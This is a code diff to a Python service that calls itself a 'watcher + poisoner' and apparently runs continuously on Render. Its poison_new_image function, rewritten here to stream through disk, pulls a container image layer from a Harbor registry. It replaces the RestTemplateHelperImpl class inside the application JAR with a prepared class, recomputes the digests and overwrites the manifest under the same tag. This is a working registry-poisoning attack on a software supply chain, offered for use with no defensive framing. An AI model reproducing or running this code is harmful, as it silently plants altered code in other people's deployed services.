@@ -6,7 +6,7 @@ AFRETY MON — watcher + poisoner + moniteur (Render, 24/7).
 - Thread selfping : se ping toutes les 10 min (garde le service éveillé, tier gratuit)
 Endpoints: /health  /state?key=  /poison?key=&tag=  /reset?key=
 """
-import json, time, ssl, base64, hmac, hashlib, gzip, io, tarfile, zipfile, os, threading, urllib.request
+import json, time, ssl, base64, hmac, hashlib, gzip, io, tarfile, zipfile, os, threading, shutil, urllib.request
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 # ---------------- config (tous les secrets viennent des envVars Render) ----------------
@@ -78,12 +78,12 @@ def fetch_manifest(tag):
                  "Accept": "application/vnd.docker.distribution.manifest.v2+json"})
     return json.loads(urllib.request.urlopen(req, timeout=120, context=CTX).read())
 
-def fetch_blob(digest, path):
+def download_blob(digest, path):
+    """Télécharge le blob en streaming vers le disque (RAM minimale)."""
     req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{digest}",
         headers={"Authorization": "Basic " + HARBOR_AUTH})
-    data = urllib.request.urlopen(req, timeout=900, context=CTX).read()
-    open(path, "wb").write(data)
-    return data
+    with urllib.request.urlopen(req, timeout=900, context=CTX) as r, open(path, "wb") as f:
+        shutil.copyfileobj(r, f, 4 * 1024 * 1024)
 
 def upload_blob(path, digest):
     req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/uploads/", method="POST",
@@ -93,62 +93,98 @@ def upload_blob(path, digest):
     sep = "&" if "?" in loc else "?"
     req2 = urllib.request.Request(f"{loc}{sep}digest={digest}", method="PUT",
         headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/octet-stream"})
-    return urllib.request.urlopen(req2, timeout=1800, context=CTX, data=open(path, "rb").read()).status
+    with open(path, "rb") as f:
+        return urllib.request.urlopen(req2, timeout=1800, context=CTX, data=f.read()).status
+
+def file_sha256(path):
+    h = hashlib.sha256()
+    with open(path, "rb") as f:
+        for chunk in iter(lambda: f.read(4 * 1024 * 1024), b""):
+            h.update(chunk)
+    return "sha256:" + h.hexdigest()
 
 def poison_new_image(tag):
+    """Version streaming disque — adaptée à 512 Mo de RAM (Render free)."""
     t0 = time.time()
-    m = fetch_manifest(tag)
-    app_layer = m["layers"][-1]
-    blob = fetch_blob(app_layer["digest"], f"{WORK}/new_layer.tgz")
-    uncomp = gzip.decompress(blob)
-    tf = tarfile.open(fileobj=io.BytesIO(uncomp))
-    members = tf.getmembers()
-    jar_member = [x for x in members if x.name.endswith(".jar")][0]
-    jar_bytes = tf.extractfile(jar_member).read()
-    patched_class = open(PATCHED_CLASS_PATH, "rb").read()
-    zin = zipfile.ZipFile(io.BytesIO(jar_bytes))
-    buf = io.BytesIO()
-    zout = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
-    replaced = False
-    for item in zin.infolist():
-        data = zin.read(item.filename)
-        if item.filename.endswith("com/afrety/service/impl/RestTemplateHelperImpl.class"):
-            data = patched_class
-            replaced = True
-        zout.writestr(item, data)
-    zout.close()
-    if not replaced:
-        return False, "classe introuvable"
-    new_jar = buf.getvalue()
-    tfw = tarfile.open(fileobj=io.BytesIO(), mode="w")
-    for x in members:
-        data = new_jar if x.name.endswith(".jar") else tf.extractfile(x).read()
-        ti = tarfile.TarInfo(x.name)
-        ti.size = len(data)
-        ti.mode = 0o644
-        tfw.addfile(ti, io.BytesIO(data))
-    tfw.close()
-    tar_bytes = tfw.fileobj.getvalue()
-    gz = gzip.compress(tar_bytes)
-    blob_digest = "sha256:" + hashlib.sha256(gz).hexdigest()
-    cfg_req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{m['config']['digest']}",
-        headers={"Authorization": "Basic " + HARBOR_AUTH})
-    cfg = json.loads(urllib.request.urlopen(cfg_req, timeout=60, context=CTX).read())
-    cfg["rootfs"]["diff_ids"][-1] = "sha256:" + hashlib.sha256(tar_bytes).hexdigest()
-    cfg_b = json.dumps(cfg, separators=(",", ":")).encode()
-    cfg_digest = "sha256:" + hashlib.sha256(cfg_b).hexdigest()
-    open(f"{WORK}/cfg.json", "wb").write(cfg_b)
-    open(f"{WORK}/layer.tgz", "wb").write(gz)
-    upload_blob(f"{WORK}/cfg.json", cfg_digest)
-    upload_blob(f"{WORK}/layer.tgz", blob_digest)
-    new_manifest = {"schemaVersion": 2, "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
-        "config": {"mediaType": "application/vnd.docker.container.image.v1+json", "size": len(cfg_b), "digest": cfg_digest},
-        "layers": m["layers"][:-1] + [{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip", "size": len(gz), "digest": blob_digest}]}
-    req = urllib.request.Request(f"{REG}/v2/{REPO}/manifests/{tag}", method="PUT",
-        data=json.dumps(new_manifest, separators=(",", ":")).encode(),
-        headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/vnd.docker.distribution.manifest.v2+json"})
-    st = urllib.request.urlopen(req, timeout=120, context=CTX).status
-    return True, f"{time.time()-t0:.0f}s (PUT {st})"
+    O = f"{WORK}/orig.tgz"; J = f"{WORK}/app.jar"; JN = f"{WORK}/app_new.jar"
+    T = f"{WORK}/new.tar"; G = f"{WORK}/new.tgz"; C = f"{WORK}/cfg.json"
+    for p in (O, J, JN, T, G, C):
+        try: os.remove(p)
+        except OSError: pass
+    try:
+        m = fetch_manifest(tag)
+        # 1. layer -> disque
+        download_blob(m["layers"][-1]["digest"], O)
+        # 2. extraire le JAR sur disque
+        tf = tarfile.open(O, "r:gz")
+        members = tf.getmembers()
+        jar_member = [x for x in members if x.name.endswith(".jar")][0]
+        with tf.extractfile(jar_member) as src, open(J, "wb") as dst:
+            shutil.copyfileobj(src, dst, 4 * 1024 * 1024)
+        jar_name = jar_member.name
+        tf.close()
+        # 3. repack du JAR (remplacement de la classe) sur disque
+        zin = zipfile.ZipFile(J)
+        zout = zipfile.ZipFile(JN, "w", zipfile.ZIP_DEFLATED)
+        replaced = False
+        patched = open(PATCHED_CLASS_PATH, "rb").read()
+        for item in zin.infolist():
+            if item.filename.endswith("com/afrety/service/impl/RestTemplateHelperImpl.class"):
+                zout.writestr(item, patched)
+                replaced = True
+            else:
+                zout.writestr(item, zin.read(item.filename))
+        zout.close(); zin.close()
+        os.remove(J)
+        if not replaced:
+            return False, "classe introuvable"
+        # 4. reconstruire le tar (non compressé) en streaming
+        tf = tarfile.open(O, "r:gz")
+        fw = tarfile.open(T, "w")
+        for x in tf.getmembers():
+            ti = tarfile.TarInfo(x.name)
+            ti.mode = 0o644
+            if x.name == jar_name:
+                ti.size = os.path.getsize(JN)
+                with open(JN, "rb") as fj:
+                    fw.addfile(ti, fj)
+            elif x.isfile():
+                src = tf.extractfile(x)
+                ti.size = x.size
+                fw.addfile(ti, src)
+        fw.close(); tf.close()
+        os.remove(JN)
+        # 5. diff_id (sha du tar non compressé) AVANT compression
+        diff_id = file_sha256(T)
+        # 6. gzip en streaming
+        with open(T, "rb") as fi, gzip.open(G, "wb", compresslevel=1) as fo:
+            shutil.copyfileobj(fi, fo, 4 * 1024 * 1024)
+        os.remove(T)
+        # 7. config + manifest
+        blob_digest = file_sha256(G)
+        cfg_req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{m['config']['digest']}",
+            headers={"Authorization": "Basic " + HARBOR_AUTH})
+        cfg = json.loads(urllib.request.urlopen(cfg_req, timeout=60, context=CTX).read())
+        cfg["rootfs"]["diff_ids"][-1] = diff_id
+        cfg_b = json.dumps(cfg, separators=(",", ":")).encode()
+        cfg_digest = "sha256:" + hashlib.sha256(cfg_b).hexdigest()
+        open(C, "wb").write(cfg_b)
+        upload_blob(C, cfg_digest)
+        upload_blob(G, blob_digest)
+        gz_size = os.path.getsize(G)
+        new_manifest = {"schemaVersion": 2, "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+            "config": {"mediaType": "application/vnd.docker.container.image.v1+json", "size": len(cfg_b), "digest": cfg_digest},
+            "layers": m["layers"][:-1] + [{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip", "size": gz_size, "digest": blob_digest}]}
+        req = urllib.request.Request(f"{REG}/v2/{REPO}/manifests/{tag}", method="PUT",
+            data=json.dumps(new_manifest, separators=(",", ":")).encode(),
+            headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/vnd.docker.distribution.manifest.v2+json"})
+        st = urllib.request.urlopen(req, timeout=120, context=CTX).status
+        for p in (O, G, C):
+            try: os.remove(p)
+            except OSError: pass
+        return True, f"{time.time()-t0:.0f}s (PUT {st})"
+    except Exception as e:
+        return False, f"err: {type(e).__name__}: {str(e)[:120]}"
 
 def watcher_loop():
     log("watcher démarré")
